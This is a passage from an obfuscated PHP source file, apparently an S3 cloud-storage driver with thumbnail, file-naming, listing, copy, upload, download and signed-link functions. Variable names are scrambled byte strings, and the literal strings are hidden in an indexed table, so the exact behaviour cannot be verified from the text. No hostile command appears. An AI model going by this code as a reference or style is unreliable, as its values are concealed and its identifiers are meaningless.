== $ØÖİ‚Ê[198]) { echo $ôÖ¶ÑÍâ; die; } Cache::set($éË­„¯‹, $ØÖİ‚Ê[198], 60); $ÆÔ…ç× = array($¬íÌ ŠÊ, $¼˜”£ÓÂ[$ØÖİ‚Ê[97]], $éË­„¯‹, $Éåô‚Àµ); $…¢•ô¢ = $ØÖİ‚Ê[199] . $¼˜”£ÓÂ[$ØÖİ‚Ê[89]] . $ØÖİ‚Ê[200] . $éË­„¯‹ . $ØÖİ‚Ê[201] . $¼˜”£ÓÂ[$ØÖİ‚Ê[32]] . $ØÖİ‚Ê[202] . $¼˜”£ÓÂ[$ØÖİ‚Ê[97]]; TaskQueue::add($ØÖİ‚Ê[203], $ÆÔ…ç×, $…¢•ô¢, $éË­„¯‹); } public function makeImageCover($ä¡…ÎÛ´, $µÔôù‰, $ˆÑıÑûÚ, $Ù¡İ‚ª”) { $™¢ôïÏ =& $_SERVER[Ñ¯©ç]; if (IO::fileNameExist($ä¡…ÎÛ´, $ˆÑıÑûÚ)) { return $™¢ôïÏ[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $õ¾ì–µç = DATA_THUMB . $ˆÑıÑûÚ; del_file($õ¾ì–µç); $‹¶ß¸·¤ = TEMP_FILES . $ˆÑıÑûÚ; if (!@file_exists($‹¶ß¸·¤)) { $‹¶ß¸·¤ = $this->download($µÔôù‰, $‹¶ß¸·¤); } if (!@file_exists($‹¶ß¸·¤)) { return $™¢ôïÏ[205]; } ImageThumb::createThumb($‹¶ß¸·¤, $õ¾ì–µç, $Ù¡İ‚ª”, $Ù¡İ‚ª” * 10); if (@file_exists($õ¾ì–µç)) { Cache::remove($ˆÑıÑûÚ); return IO::move($õ¾ì–µç, $ä¡…ÎÛ´); } Cache::set($ˆÑıÑûÚ, $™¢ôïÏ[197], 600); del_file($õ¾ì–µç); return $™¢ôïÏ[206] . $‹¶ß¸·¤ . $™¢ôïÏ[84]; } public function fileOutImageServer($Â¹‘ë£©, $³Â¡€œİ = 250) { $this->fileOutImage($Â¹‘ë£©, $³Â¡€œİ); } public function fileNameAuto($Ãâ±, $ìÅúÒ«Ë, $áÇûåÌ‰ = REPEAT_RENAME, $ËİÀ–é = false) { $„Şãù‰ì =& $_SERVER[Ñ¯©ç]; $¸Šö¹ùÙ = $Ãâ± === $„Şãù‰ì[12] ? $ìÅúÒ«Ë : rtrim($Ãâ±, $„Şãù‰ì[8]) . $„Şãù‰ì[8] . $ìÅúÒ«Ë; if ($áÇûåÌ‰ == REPEAT_REPLACE || !$this->exist($¸Šö¹ùÙ) || $ËİÀ–é && $áÇûåÌ‰ != REPEAT_RENAME_FOLDER) { return $ìÅúÒ«Ë; } if ($áÇûåÌ‰ == REPEAT_SKIP) { return !1; } $¹Òú…¢ë = $„Şãù‰ì[10] . get_path_ext($ìÅúÒ«Ë); $¹Òú…¢ë = $¹Òú…¢ë == $„Şãù‰ì[10] || $ËİÀ–é ? $„Şãù‰ì[12] : $¹Òú…¢ë; $Ñ¨Ñ«Åï = 1; $±‚İÖ±Â = substr($ìÅúÒ«Ë, 0, strlen($ìÅúÒ«Ë) - strlen($¹Òú…¢ë)); $ÌáÊ¬³ç = $±‚İÖ±Â . "\50{$Ñ¨Ñ«Åï}\x29{$¹Òú…¢ë}"; while ($this->exist(rtrim($Ãâ±, $„Şãù‰ì[8]) . $„Şãù‰ì[8] . $ÌáÊ¬³ç)) { $ÌáÊ¬³ç = $±‚İÖ±Â . "\x28{$Ñ¨Ñ«Åï}\51{$¹Òú…¢ë}"; $Ñ¨Ñ«Åï++; } return $ÌáÊ¬³ç; } private function fileNameAutoList($…‡ûü¡¬, $ä¥îî›, $ìèÇËÕ = false) { $ÎàÖî„œ =& $_SERVER[Ñ¯©ç]; $ìâÛƒ• = $this->listPath($…‡ûü¡¬, !0); $ìâÛƒ• = array_merge($ìâÛƒ•[$ÎàÖî„œ[95]], $ìâÛƒ•[$ÎàÖî„œ[96]]); $ĞÎ—ïì = array_to_keyvalue($ìâÛƒ•, $ÎàÖî„œ[12], $ÎàÖî„œ[32]); $‰ÏÔ»‚Œ = $ÎàÖî„œ[10] . get_path_ext($ä¥îî›); $‰ÏÔ»‚Œ = $‰ÏÔ»‚Œ == $ÎàÖî„œ[10] || $ìèÇËÕ ? $ÎàÖî„œ[12] : $‰ÏÔ»‚Œ; $àĞìÏ²¶ = substr($ä¥îî›, 0, strlen($ä¥îî›) - strlen($‰ÏÔ»‚Œ)); $Ô•Øš©¿ = $àĞìÏ²¶ . "\50\60\51{$‰ÏÔ»‚Œ}"; for ($õ…ØƒÄ“ = 1; $õ…ØƒÄ“ <= count($ĞÎ—ïì) + 1; $õ…ØƒÄ“++) { $Ô•Øš©¿ = $àĞìÏ²¶ . "\x28{$õ…ØƒÄ“}\51{$‰ÏÔ»‚Œ}"; if (!in_array_not_case($Ô•Øš©¿, $ĞÎ—ïì)) { return $Ô•Øš©¿; } } return $Ô•Øš©¿; } public function listAllFiles($ÉÔÆÌäõ, $÷ŠÈûÊß) { $´æš”ü =& $_SERVER[Ñ¯©ç]; if (empty($÷ŠÈûÊß)) { return array(); } $–ÀäÒÑâ = array_keys($÷ŠÈûÊß); $ßŞı™¿Ñ = array(); $ÉÔÆÌäõ = trim($ÉÔÆÌäõ, $´æš”ü[8]); foreach ($÷ŠÈûÊß as $ÇãØÑ¤ => $¾Û”È) { $õ•†¯“Ï = ltrim(substr(trim($ÇãØÑ¤, $´æš”ü[8]), strlen($ÉÔÆÌäõ)), $´æš”ü[8]); if (substr($ÇãØÑ¤, -1) == $´æš”ü[8]) { $õ•†¯“Ï = rtrim($õ•†¯“Ï, $´æš”ü[8]) . $´æš”ü[8]; } $ßŞı™¿Ñ = array_merge($ßŞı™¿Ñ, $this->slicePath($õ•†¯“Ï)); } $Ÿíìâ¸— = array(); foreach (array_unique($ßŞı™¿Ñ) as $İ’ªŒ¾) { $¤òöèĞå = array($´æš”ü[97] => $this->getPathOuter($´æš”ü[8] . $ÉÔÆÌäõ . $´æš”ü[8] . $İ’ªŒ¾), $´æš”ü[88] => 1, $´æš”ü[89] => 0); if (substr($İ’ªŒ¾, -1) != $´æš”ü[8]) { $¤òöèĞå[$´æš”ü[88]] = 0; $å şıÉ¨ = $this->getPath($ÉÔÆÌäõ . $´æš”ü[8] . $İ’ªŒ¾); if (isset($÷ŠÈûÊß[$å şıÉ¨])) { $¶ßğÅÑà = $÷ŠÈûÊß[$å şıÉ¨]; if (isset($¶ßğÅÑà[$´æš”ü[89]])) { $¤òöèĞå[$´æš”ü[89]] = intval($¶ßğÅÑà[$´æš”ü[89]]); } if (isset($¶ßğÅÑà[$´æš”ü[207]])) { $¤òöèĞå[$´æš”ü[98]] = intval($¶ßğÅÑà[$´æš”ü[207]]); } } } $Ÿíìâ¸—[] = $¤òöèĞå; } return $Ÿíìâ¸—; } public function slicePath($á–¬ƒì«) { $Ï­ù«©§ =& $_SERVER[Ñ¯©ç]; $ÁŒô¨² = explode($Ï­ù«©§[8], trim($á–¬ƒì«, $Ï­ù«©§[8])); $¤½ş°Ê = 0; do { ++$¤½ş°Ê; $­ášÀËà[] = implode($Ï­ù«©§[8], array_slice($ÁŒô¨², 0, $¤½ş°Ê)) . $Ï­ù«©§[8]; } while ($¤½ş°Ê < count($ÁŒô¨²)); $­ášÀËà[count($ÁŒô¨²) - 1] = $á–¬ƒì«; return $­ášÀËà; } public function getHost() { $»ş‹×”Ñ =& $_SERVER[Ñ¯©ç]; $À¸…«Ã— = parse_url(trim($this->domain, $»ş‹×”Ñ[8])); $óŒç° = isset($À¸…«Ã—[$»ş‹×”Ñ[208]]) ? $À¸…«Ã—[$»ş‹×”Ñ[208]] : http_type(); $íª¿–ï¿ = isset($À¸…«Ã—[$»ş‹×”Ñ[209]]) ? $À¸…«Ã—[$»ş‹×”Ñ[209]] : $À¸…«Ã—[$»ş‹×”Ñ[97]]; if (isset($À¸…«Ã—[$»ş‹×”Ñ[210]])) { $íª¿–ï¿ .= $»ş‹×”Ñ[4] . $À¸…«Ã—[$»ş‹×”Ñ[210]]; } return $óŒç° . $»ş‹×”Ñ[211] . $íª¿–ï¿; } public function pathEncode($Ã¿İáİŸ) { $´ğÕ‘ƒ =& $_SERVER[Ñ¯©ç]; return str_replace($´ğÕ‘ƒ[212], $´ğÕ‘ƒ[8], rawurlencode($Ã¿İáİŸ)); } public function writeLog($º›ôª¾ë = '', $ãÂ„ã‡Š = false) { $‰¨½Œ¡Š =& $_SERVER[Ñ¯©ç]; $Í’Ç©² = in_array(ACTION, array($‰¨½Œ¡Š[213], $‰¨½Œ¡Š[214])); if (!$Í’Ç©² && !GLOBAL_DEBUG) { return; } $Åƒúêš¿ = $º›ôª¾ë; static $Š”ÃâĞ = null; if (!$Š”ÃâĞ) { $Š”ÃâĞ = strtoupper($this->getType()); } $º›ôª¾ë = $Š”ÃâĞ . $‰¨½Œ¡Š[215] . $º›ôª¾ë; if ($ãÂ„ã‡Š) { $…€ËÙšç = error_get_last(); if ($…€ËÙšç) { $º›ôª¾ë = array($º›ôª¾ë, $…€ËÙšç); } } write_log($º›ôª¾ë, $‰¨½Œ¡Š[216]); if ($Í’Ç©²) { throw new Exception($Åƒúêš¿); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¼™°úÜ¡) { set_timeout(); require_once SDK_DIR . $_SERVER[Ñ¯©ç][217]; parent::__construct(); $this->_init($¼™°úÜ¡); } public function _init($Şå¬€ÀÊ) { $³»ÛëŒµ =& $_SERVER[Ñ¯©ç]; $this->config = $Şå¬€ÀÊ; foreach ($Şå¬€ÀÊ as $›«­Ñó => $Ü¾¯™‡) { if (isset($this->{$›«­Ñó})) { $this->{$›«­Ñó} = $Ü¾¯™‡; } } $this->endpoint = $Şå¬€ÀÊ[$³»ÛëŒµ[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($³»ÛëŒµ[213], $³»ÛëŒµ[214]))) { $this->client->setExceptions(); } } public function setSignVersion($Ú³ï“ê³ = "\x76\64") { $this->signVer = $Ú³ï“ê³; $this->client->setSignatureVersion($Ú³ï“ê³); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ÚéÎã£ä) { return null; } } public function isBucketCors() { $ôìåŞÊä =& $_SERVER[Ñ¯©ç]; $Ä¯ŠÚË² = $this->getBucketCors(); if (!$Ä¯ŠÚË² || !is_array($Ä¯ŠÚË²)) { return !1; } if (!is_array($Ä¯ŠÚË²[$ôìåŞÊä[219]])) { $Ä¯ŠÚË²[$ôìåŞÊä[219]] = explode($ôìåŞÊä[50], $Ä¯ŠÚË²[$ôìåŞÊä[219]]); } if ($Ä¯ŠÚË²[$ôìåŞÊä[220]] != $ôìåŞÊä[221] || !in_array($ôìåŞÊä[221], $Ä¯ŠÚË²[$ôìåŞÊä[219]])) { return !1; } $ë²°é—È = array_map($ôìåŞÊä[222], $Ä¯ŠÚË²[$ôìåŞÊä[223]]); if (!is_array($ë²°é—È)) { $ë²°é—È = array(); } $ı£™İ›¼ = array($ôìåŞÊä[224], $ôìåŞÊä[225], $ôìåŞÊä[226], $ôìåŞÊä[227], $ôìåŞÊä[228]); $úÂÈ¬²· = array_diff($ı£™İ›¼, $ë²°é—È); return empty($úÂÈ¬²·); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Æ—®á£Á, $ÎœÍ«¨× = '', $ÑöÌéÑ® = REPEAT_RENAME) { $‡‘œ¤á = $this->setContent($Æ—®á£Á, $ÎœÍ«¨×); if ($‡‘œ¤á !== !1) { return $this->getPathOuter($Æ—®á£Á); } return !1; } public function mkdir($ªÁœÄ², $Ä•¡Éõ— = REPEAT_SKIP) { $Á…Çü„ =& $_SERVER[Ñ¯©ç]; if (empty($ªÁœÄ²) && $ªÁœÄ² !== $Á…Çü„[229]) { return !1; } if ($Ä•¡Éõ— && $this->_isFolder($ªÁœÄ²)) { return $this->getPathOuter($ªÁœÄ²); } $Ä™ß¿éÑ = $this->setContent($ªÁœÄ², $Á…Çü„[12], !0); if ($Ä™ß¿éÑ !== !1) { return $this->getPathOuter($ªÁœÄ²); } return !1; } public function copyFile($òéùÔ“‡, $ˆ¶©ÌÈ†, $Ğä“ÅÍ = array()) { $¢Ÿğçê› =& $_SERVER[Ñ¯©ç]; $À†òùÙû = $this->objectMeta($òéùÔ“‡); if (!$À†òùÙû) { return !1; } if ($À†òùÙû[$¢Ÿğçê›[89]] <= 1024 * 1024 * 200) { $Çøı½å³ = $this->client->copyObject($this->bucket, $òéùÔ“‡, $this->bucket, $ˆ¶©ÌÈ†, $¢Ÿğçê›[230], $Ğä“ÅÍ); } else { $Çøı½å³ = $this->client->multiCopyObject($this->bucket, $òéùÔ“‡, $this->bucket, $ˆ¶©ÌÈ†, $Ğä“ÅÍ); } $Çøı½å³ = $Çøı½å³ ? $this->getPathOuter($ˆ¶©ÌÈ†) : !1; return $Çøı½å³; } public function moveFile($¸ªæÁÕê, $ÓâÕğ­ß) { if ($this->copyFile($¸ªæÁÕê, $ÓâÕğ­ß)) { $this->delFile($¸ªæÁÕê); return $this->getPathOuter($ÓâÕğ­ß); } return !1; } public function delFile($Ñ€Ïü¹õ) { return $this->client->deleteObject($this->bucket, $Ñ€Ïü¹õ); } public function delFolder($—Á‰íÑ”) { $×«Ä’áÆ =& $_SERVER[Ñ¯©ç]; if (!$this->exist($—Á‰íÑ”)) { return !0; } $this->listItemCache = !1; $¬·…ò® = $this->fileList($—Á‰íÑ”); $this->listItemCache = !0; $Á™Ëäè = trim($—Á‰íÑ”, $×«Ä’áÆ[8]) . $×«Ä’áÆ[8]; if (!empty($—Á‰íÑ”) && $—Á‰íÑ” !== $×«Ä’áÆ[229] && !in_array($Á™Ëäè, $¬·…ò®[$×«Ä’áÆ[95]])) { $¬·…ò®[$×«Ä’áÆ[95]][] = $Á™Ëäè; } $¶·º´±› = $this->delByBatch($¬·…ò®[$×«Ä’áÆ[96]]); if (!$¶·º´±›) { return !1; } $¶·º´±› = $this->delByBatch($¬·…ò®[$×«Ä’áÆ[95]]); if (!$¶·º´±›) { return !1; } return $this->delFile($Á™Ëäè); } private function delByBatch($÷ªŒàœŠ) { foreach (array_chunk($÷ªŒàœŠ, 1000) as $¶„úŸÕØ) { $ç½å©†Ë = $this->client->deleteObjects($this->bucket, $¶„úŸÕØ); if (!$ç½å©†Ë) { return !1; } } return !0; } public function rename($Ôè’Í­, $ïµû¿ò) { return $this->renameObject($Ôè’Í­, $ïµû¿ò); } public function listPath($í¥…¢ó, $îº…û = false) { $¦¿ıÃã =& $_SERVER[Ñ¯©ç]; $ÓÊ‡½º = $this->fileList($í¥…¢ó, $¦¿ıÃã[8], !0); foreach ($ÓÊ‡½º[$¦¿ıÃã[95]] as $°Ô’£‹İ => $¶‹¯ÆáÉ) { $ÓÊ‡½º[$¦¿ıÃã[95]][$°Ô’£‹İ] = $this->folderInfo($¶‹¯ÆáÉ, $îº…û, $¶‹¯ÆáÉ); } foreach ($ÓÊ‡½º[$¦¿ıÃã[96]] as $°Ô’£‹İ => $¶‹¯ÆáÉ) { $ÓÊ‡½º[$¦¿ıÃã[96]][$°Ô’£‹İ] = $this->fileInfo($¶‹¯ÆáÉ[$¦¿ıÃã[32]], $îº…û, $¶‹¯ÆáÉ); } return $ÓÊ‡½º; } protected function infoChildren($£ï¶´Û, &$­ ´—œ) { $›·şÎÖ¦ =& $_SERVER[Ñ¯©ç]; $‚á”¤Í® = $this->fileList($£ï¶´Û, $›·şÎÖ¦[12], !0); $­ ´—œ[$›·şÎÖ¦[91]] += count($‚á”¤Í®[$›·şÎÖ¦[95]]); $­ ´—œ[$›·şÎÖ¦[90]] += count($‚á”¤Í®[$›·şÎÖ¦[96]]); foreach ($‚á”¤Í®[$›·şÎÖ¦[96]] as $¥ë†¯úÔ) { if (!$¥ë†¯úÔ || !$¥ë†¯úÔ[$›·şÎÖ¦[89]]) { continue; } $­ ´—œ[$›·şÎÖ¦[89]] += $¥ë†¯úÔ[$›·şÎÖ¦[89]]; } } private function fileInfo($ÍØİ”¤, $õÎİì = false, $ìù£™ = array()) { $˜¼°ãºø =& $_SERVER[Ñ¯©ç]; $¤šâË« = array($˜¼°ãºø[32] => $this->pathThis($ÍØİ”¤), $˜¼°ãºø[97] => $this->getPathOuter($ÍØİ”¤), $˜¼°ãºø[33] => $˜¼°ãºø[231], $˜¼°ãºø[188] => $this->ext($ÍØİ”¤), $˜¼°ãºø[89] => isset($ìù£™[$˜¼°ãºø[89]]) ? $ìù£™[$˜¼°ãºø[89]] : 0); if ($õÎİì) { return $¤šâË«; } $¤šâË«[$˜¼°ãºø[232]] = $¤šâË«[$˜¼°ãºø[98]] = 0; $¤šâË«[$˜¼°ãºø[233]] = $¤šâË«[$˜¼°ãºø[234]] = !0; if (empty($ìù£™)) { $ìù£™ = $this->objectMeta($ÍØİ”¤); if (!$ìù£™) { return $¤šâË«; } } if (isset($ìù£™[$˜¼°ãºø[235]]) && $ìù£™[$˜¼°ãºø[235]]) { $¤šâË«[$˜¼°ãºø[236]] = $ìù£™[$˜¼°ãºø[235]]; } if (isset($ìù£™[$˜¼°ãºø[207]])) { $¤šâË«[$˜¼°ãºø[98]] = $ìù£™[$˜¼°ãºø[207]]; } if (isset($ìù£™[$˜¼°ãºø[89]])) { $¤šâË«[$˜¼°ãºø[89]] = $ìù£™[$˜¼°ãºø[89]]; } return $¤šâË«; } private function folderInfo($áş¾‹ˆ¦, $½ïÙ¹áÃ = false, $á»Æ²‚ = array()) { $ÅÁ‹Ñ° =& $_SERVER[Ñ¯©ç]; $çşõ×† = array($ÅÁ‹Ñ°[32] => $this->pathThis($áş¾‹ˆ¦), $ÅÁ‹Ñ°[97] => $this->getPathOuter($ÅÁ‹Ñ°[8] . $áş¾‹ˆ¦), $ÅÁ‹Ñ°[33] => $ÅÁ‹Ñ°[88]); if ($½ïÙ¹áÃ) { return $çşõ×†; } $çşõ×†[$ÅÁ‹Ñ°[232]] = $çşõ×†[$ÅÁ‹Ñ°[98]] = 0; $çşõ×†[$ÅÁ‹Ñ°[233]] = $çşõ×†[$ÅÁ‹Ñ°[234]] = !0; if ($áş¾‹ˆ¦ == $ÅÁ‹Ñ°[12]) { return $çşõ×†; } if (empty($á»Æ²‚)) { $á»Æ²‚ = $this->objectMeta(trim($áş¾‹ˆ¦, $ÅÁ‹Ñ°[8]) . $ÅÁ‹Ñ°[8]); } if (isset($á»Æ²‚[$ÅÁ‹Ñ°[207]])) { $çşõ×†[$ÅÁ‹Ñ°[232]] = $á»Æ²‚[$ÅÁ‹Ñ°[207]]; } return $çşõ×†; } private function fileList($ëæ´¾², $©Œî¥ƒŒ = '', $ŸÔ¶ü­ = 0) { $Ø›óË£Â =& $_SERVER[Ñ¯©ç]; $áåÎ´“ = rtrim($ëæ´¾², $Ø›óË£Â[8]) . $Ø›óË£Â[8]; $ÅİÏ¬ä¢ = $this->listObjs($áåÎ´“, null, null, $©Œî¥ƒŒ); if (!$ÅİÏ¬ä¢) { return array($Ø›óË£Â[95] => array(), $Ø›óË£Â[96] => array()); } $ Œö¨´µ = $ˆúã”õš = array(); foreach ($ÅİÏ¬ä¢[$Ø›óË£Â[237]] as $„ßñÂ‹) { $ô•¿™Ø = $„ßñÂ‹[$Ø›óË£Â[32]]; if ($ô•¿™Ø == $áåÎ´“) { continue; } $ÜºÜáßÕ = isset($„ßñÂ‹[$Ø›óË£Â[89]]) ? $„ßñÂ‹[$Ø›óË£Â[89]] : 0; $–ÀÇşß¡ = $ÜºÜáßÕ == 0 && substr($ô•¿™Ø, strlen($ô•¿™Ø) - 1, 1) == $Ø›óË£Â[8] ? !0 : !1; $this->cacheMethodInfoSet($ô•¿™Ø, $–ÀÇşß¡, $„ßñÂ‹); if ($–ÀÇşß¡) { $ Œö¨´µ[] = $ô•¿™Ø; continue; } $ˆúã”õš[] = $ŸÔ¶ü­ ? $„ßñÂ‹ : $ô•¿™Ø; } foreach ($ÅİÏ¬ä¢[$Ø›óË£Â[238]] as $„ßñÂ‹) { $ Œö¨´µ[] = $„ßñÂ‹[$Ø›óË£Â[32]]; $this->cacheMethodInfoSet($„ßñÂ‹[$Ø›óË£Â[32]], !0); } $this->cacheMethodInfoSet($ëæ´¾², !0); return array($Ø›óË£Â[95] => $ Œö¨´µ, $Ø›óË£Â[96] => $ˆúã”õš); } private function listObjs($¼Ò˜àÕÇ, $”ëÂŸîŠ = null, $È³°”Èå = null, $­²°Í˜³ = null) { $Í¯‹‚ú =& $_SERVER[Ñ¯©ç]; $¼Ò˜àÕÇ = trim($¼Ò˜àÕÇ, $Í¯‹‚ú[8]); $íÖ“ğ² = empty($¼Ò˜àÕÇ) && $¼Ò˜àÕÇ !== $Í¯‹‚ú[229] ? $Í¯‹‚ú[12] : $¼Ò˜àÕÇ . $Í¯‹‚ú[8]; return $this->client->getBucket($this->bucket, $íÖ“ğ², $”ëÂŸîŠ, $È³°”Èå, $­²°Í˜³, !0); } public function has($®ğÙÌÆ±, $‰°£’•® = false, $ÕıŞóŒ™ = true) { $á©º™õÔ =& $_SERVER[Ñ¯©ç]; $®ğÙÌÆ± = trim($®ğÙÌÆ±, $á©º™õÔ[8]); $¦¡æ¸§ = empty($®ğÙÌÆ±) && $®ğÙÌÆ± !== $á©º™õÔ[229] ? $á©º™õÔ[12] : $®ğÙÌÆ± . $á©º™õÔ[8]; $¸»óç“ğ = null; $¤¥ª¾À = 500; $åôï¿ñ™ = $á©º™õÔ[8]; $€µ¾²Ç× = $Ÿã‡Êâ = array(); while (!0) { $ïïÈİ¨‡ = $this->listObjs($®ğÙÌÆ±, $¸»óç“ğ, $¤¥ª¾À, $åôï¿ñ™); if (!$ïïÈİ¨‡) { break; } $¸»óç“ğ = $ïïÈİ¨‡[$á©º™õÔ[239]]; $Ñ¬ñá–˜ = $ïïÈİ¨‡[$á©º™õÔ[237]]; $Îœº„–Ä = $ïïÈİ¨‡[$á©º™õÔ[238]]; if (empty($Ñ¬ñá–˜) && empty($Îœº„–Ä)) { break; } if (count($Ñ¬ñá–˜) == 1 && $Ñ¬ñá–˜[0][$á©º™õÔ[32]] == $¦¡æ¸§) { break; } if ($‰°£’•®) { if (count($Ñ¬ñá–˜)) { $Ñ¬ñá–˜ = array_column($Ñ¬ñá–˜, $á©º™õÔ[32]); $€µ¾²Ç× = array_merge($€µ¾²Ç×, $Ñ¬ñá–˜); } if (count($Îœº„–Ä)) { $Îœº„–Ä = array_column($Îœº„–Ä, $á©º™õÔ[32]); $Ÿã‡Êâ = array_merge($Ÿã‡Êâ, $Îœº„–Ä); } if ($¸»óç“ğ === null) { break; } continue; } if ($ÕıŞóŒ™) { if (!empty($Ñ¬ñá–˜)) { if (count($Ñ¬ñá–˜) > 1 || isset($Ñ¬ñá–˜[0][$á©º™õÔ[32]]) && $Ñ¬ñá–˜[0][$á©º™õÔ[32]] != $¦¡æ¸§) { return !0; } } } else { if (!empty($Îœº„–Ä)) { return !0; } } if ($¸»óç“ğ === null) { break; } } if ($‰°£’•®) { $€µ¾²Ç× = array_diff($€µ¾²Ç×, array($¦¡æ¸§)); $€µ¾²Ç× = count(array_unique($€µ¾²Ç×)); $Ÿã‡Êâ = count(array_unique($Ÿã‡Êâ)); return array($á©º™õÔ[240] => $€µ¾²Ç×, $á©º™õÔ[241] => $Ÿã‡Êâ); } return !1; } public function listAll($ä˜úí¦) { $Ç´×ïã =& $_SERVER[Ñ¯©ç]; $ËĞŠ°ÆÖ = $this->fileList($ä˜úí¦, $Ç´×ïã[12], !0); $Ë°²Á†” = array_to_keyvalue($ËĞŠ°ÆÖ[$Ç´×ïã[96]], $Ç´×ïã[32]); foreach ($ËĞŠ°ÆÖ[$Ç´×ïã[95]] as $øŞğ˜Ş±) { if (is_string($øŞğ˜Ş±)) { $Ë°²Á†”[$øŞğ˜Ş±] = array($Ç´×ïã[89] => 0); } } return $this->listAllFiles($ä˜úí¦, $Ë°²Á†”); } public function canRead($üæù³Õ) { $é½§‚˜ô =& $_SERVER[Ñ¯©ç]; $ı‹¤ö¸Ÿ = $this->client->getAccessControlPolicy($this->bucket, $üæù³Õ); if (!$ı‹¤ö¸Ÿ) { return !1; } return in_array($ı‹¤ö¸Ÿ, array($é½§‚˜ô[242], $é½§‚˜ô[243], $é½§‚˜ô[244])) ? !0 : !1; } public function canWrite($‰ËÕ•ù£) { $Èå¸ñÂœ =& $_SERVER[Ñ¯©ç]; $àŞê€Ôí = $this->client->getAccessControlPolicy($this->bucket, $‰ËÕ•ù£); if (!$àŞê€Ôí) { return !1; } return in_array($àŞê€Ôí, array($Èå¸ñÂœ[242], $Èå¸ñÂœ[243])) ? !0 : !1; } public function getContent($îæ¢›Æ) { return $this->client->getObject($this->bucket, $îæ¢›Æ); } public function setContent($•ËÀşşà, $°İŸÇÉ× = '', $º‡ˆòĞÕ = false) { $æøèëùù =& $_SERVER[Ñ¯©ç]; $•ËÀşşà = $º‡ˆòĞÕ ? trim($•ËÀşşà, $æøèëùù[8]) . $æøèëùù[8] : $•ËÀşşà; $µü¨Ş®© = get_file_mime(get_path_ext($•ËÀşşà)); $ã¯³²ìì = $this->client->putObject($°İŸÇÉ×, $this->bucket, $•ËÀşşà, $æøèëùù[230], array(), $µü¨Ş®©); if (!$ã¯³²ìì) { return !1; } if ($º‡ˆòĞÕ) { return !0; } return $ã¯³²ìì ? !0 : !1; } public function fileSubstr($¸ÓÄ’ğï, $æÇ‡ªÇä, $éüØÖÓ†) { $ö›‹üØƒ = $æÇ‡ªÇä + $éüØÖÓ† - 1; return $this->client->getObject($this->bucket, $¸ÓÄ’ğï, array($_SERVER[Ñ¯©ç][245] => "\142\171\164\x65\163\x3d{$æÇ‡ªÇä}\x2d{$ö›‹üØƒ}")); } public function upload($Ô“€µüÁ, $·æôğŠï, $Ú·ë¸İ‰ = false, $— À¹±´ = REPEAT_REPLACE) { $°„áùªí =& $_SERVER[Ñ¯©ç]; $æ¶êí†è = array($°„áùªí[246] => @md5_file($·æôğŠï)); $Æ‚×” = array($°„áùªí[247] => get_file_mime(get_path_ext($Ô“€µüÁ))); if (IO::size($·æôğŠï) <= 1024 * 1024 * 200) { $›«İÓü = $this->client->putObjectFile($·æôğŠï, $this->bucket, $Ô“€µüÁ, $°„áùªí[230], $æ¶êí†è, $Æ‚×”); return !empty($›«İÓü) ? $this->getPathOuter($Ô“€µüÁ) : !1; } $¡ğÌôøÜ = $this->client->multiUploadObject($·æôğŠï, $this->bucket, trim($Ô“€µüÁ, $°„áùªí[8]), $æ¶êí†è, $Æ‚×”); return $¡ğÌôøÜ ? $this->getPathOuter($Ô“€µüÁ) : !1; } public function download($æ¨Ãğôò, $«İñ²…û) { if (!@is_dir($this->pathFather($«İñ²…û)) && !IO::mkdir($this->pathFather($«İñ²…û))) { return !1; } $ªÓÑ…Ÿù = $this->client->getObject($this->bucket, $æ¨Ãğôò, array(), $«İñ²…û); return $ªÓÑ…Ÿù !== !1 ? $«İñ²…û : !1; } public function link($õú÷æû‘, $œûİê = array()) { $”±ÇŒ² =& $_SERVER[Ñ¯©ç]; if ($this->signVer == $”±ÇŒ²[248]) { return $this->client->getAuthenticatedURL($this->bucket, $õú÷æû‘, 3600 * 12, $œûİê); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($õú÷æû‘, $”±ÇŒ²[8]), 3600 * 12, $this->region, array(), !0, $œûİê); } public function fileOut($÷»â², $„…ø¤Àš = false, $‘ûÖ›®ø = false, $àÖ¤ö¬ë = '') { $‡Êì¨ˆÒ =& $_SERVER[Ñ¯©ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($÷»â², $„…ø¤Àš, $‘ûÖ›®ø, $àÖ¤ö¬ë); } if (!$‘ûÖ›®ø) { $‘ûÖ›®ø = $this->pathThis($÷»â²); } $¤öàÕ÷’ = get_file_mime(get_path_ext($‘ûÖ›®ø)); if ($¤öàÕ÷’ == $‡Êì¨ˆÒ[249]) { return parent::fileOut($÷»â², $„…ø¤Àš, $‘ûÖ›®ø, $àÖ¤ö¬ë); } $“’Æ„Ç› = array($‡Êì¨ˆÒ[250] => $¤öàÕ÷’); if ($„…ø¤Àš) { $“’Æ„Ç›[$‡Êì¨ˆÒ[251]] = $‡Êì¨ˆÒ[252] . rawurlencode($‘ûÖ›®ø); } else { } $‚èÏ‘ùç = $this->link($÷»â², $“’Æ„Ç›); $this->fileOutLink($‚èÏ‘ùç); } public function fileOutServer($¦Æ¢Í¦, $ğÀ‘˜‚ = false, $ßû¡Éªã = false, $¤çÑõê = '') { parent::fileOut($¦Æ¢Í¦, $ğÀ‘˜‚, $ßû¡Éªã, $¤çÑõê); } public function fileOutImageServer($Ùç´Æ, $¸±®µ’é = 250) { parent::fileOutImage($Ùç´Æ, $¸±®µ’é); } public function hashMd5($¾©ñ¤à•, $ªÈÆ‰Ï = '') { $ü¥¤×‰ = $this->objectMeta($¾©ñ¤à•); if (!$ü¥¤×‰) { return !1; } $ªÈÆ‰Ï = $ªÈÆ‰Ï ? $ªÈÆ‰Ï : _get($ü¥¤×‰, $_SERVER[Ñ¯©ç][253]); return $ªÈÆ‰Ï; } public function uploadFormData($€õƒÂ¦É, $şàøŒıÃ = 3600) { 